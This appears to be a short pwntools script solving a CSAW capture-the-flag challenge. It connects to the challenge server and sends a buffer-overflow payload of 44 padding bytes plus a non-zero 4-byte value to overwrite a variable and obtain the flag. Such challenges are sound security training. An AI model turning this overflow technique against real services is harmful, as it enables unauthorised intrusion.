from pwn import *

# Connect to the remote server
p = remote("pwn.chal.csaw.io", 31140)

# Receive the prompt
p.recvuntil(b"The penguins are watching: ")

# Send payload: 44 bytes padding + 4 bytes non-zero value
payload = b"A" * 44 + p32(1)
p.sendline(payload)

# Receive and print the flag
print(p.recvall().decode("ascii"))
